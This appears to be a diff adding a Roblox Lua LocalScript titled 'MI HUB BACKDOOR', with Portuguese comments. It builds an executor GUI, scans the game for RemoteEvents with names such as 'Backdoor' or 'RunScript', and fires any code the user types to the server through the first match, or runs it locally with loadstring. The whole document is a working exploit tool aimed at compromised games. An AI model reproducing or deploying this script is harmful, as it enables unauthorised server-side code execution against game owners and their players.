@@ -1,0 +1,123 @@
+-- LocalScript em StarterGui
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LALOL_Hub_Backdoor"
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 500, 0, 275)
+frame.Position = UDim2.new(0.5, -250, 0.5, -137)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "MI HUB BACKDOOR"
+title.Font = Enum.Font.FredokaOne
+title.TextScaled = true
+title.TextColor3 = Color3.new(1, 1, 1)
+
+local gradient = Instance.new("UIGradient", title)
+gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
+	ColorSequenceKeypoint.new(0.25, Color3.fromRGB(255, 0, 255)),
+	ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 255)),
+	ColorSequenceKeypoint.new(0.75, Color3.fromRGB(0, 255, 255)),
+	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 0))
+})
+
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(1, -20, 0, 130)
+box.Position = UDim2.new(0, 10, 0, 60)
+box.Text = "Put your require or script here!"
+box.Font = Enum.Font.Code
+box.TextSize = 18
+box.TextWrapped = true
+box.TextXAlignment = Enum.TextXAlignment.Left
+box.TextYAlignment = Enum.TextYAlignment.Top
+box.ClearTextOnFocus = false
+box.MultiLine = true
+box.TextColor3 = Color3.fromRGB(255, 255, 255)
+box.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+box.BorderSizePixel = 0
+
+local execute = Instance.new("TextButton", frame)
+execute.Size = UDim2.new(0.5, -15, 0, 40)
+execute.Position = UDim2.new(0, 10, 1, -50)
+execute.Text = "Execute"
+execute.Font = Enum.Font.FredokaOne
+execute.TextColor3 = Color3.fromRGB(0, 255, 0)
+execute.TextScaled = true
+execute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+execute.BorderColor3 = Color3.fromRGB(0, 255, 0)
+execute.BorderSizePixel = 2
+
+local clear = Instance.new("TextButton", frame)
+clear.Size = UDim2.new(0.5, -15, 0, 40)
+clear.Position = UDim2.new(0.5, 5, 1, -50)
+clear.Text = "Clear"
+clear.Font = Enum.Font.FredokaOne
+clear.TextColor3 = Color3.fromRGB(0, 255, 255)
+clear.TextScaled = true
+clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+clear.BorderColor3 = Color3.fromRGB(0, 255, 255)
+clear.BorderSizePixel = 2
+
+clear.MouseButton1Click:Connect(function()
+	box.Text = ""
+end)
+
+-- VARIÁVEL GLOBAL: guarda o backdoor se encontrado
+local backdoorDetectado = nil
+
+-- Função que procura um possível backdoor
+local function procurarBackdoor()
+	local locais = {game.ReplicatedStorage, game.Workspace, game:GetService("Players")}
+	local nomesSuspeitos = {"Backdoor", "Execute", "RunScript", "Remote", "SS", "Server", "System", "Control"}
+
+	for _, localAtual in ipairs(locais) do
+		for _, obj in ipairs(localAtual:GetDescendants()) do
+			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+				for _, nome in ipairs(nomesSuspeitos) do
+					if string.lower(obj.Name):find(string.lower(nome)) then
+						return obj -- achou
+					end
+				end
+			end
+		end
+	end
+	return nil
+end
+
+-- ✅ Verifica automaticamente ao iniciar
+task.delay(1, function()
+	backdoorDetectado = procurarBackdoor()
+	if backdoorDetectado then
+		warn("✅ Backdoor encontrado ao iniciar: " .. backdoorDetectado:GetFullName())
+	else
+		warn("❌ Nenhum backdoor detectado ao iniciar.")
+	end
+end)
+
+-- Quando clicar "Execute"
+execute.MouseButton1Click:Connect(function()
+	local code = box.Text
+
+	if backdoorDetectado then
+		pcall(function()
+			backdoorDetectado:FireServer(code)
+		end)
+	else
+		pcall(function()
+			local func = loadstring(code)
+			if func then
+				func()
+			end
+		end)
+	end
+end)
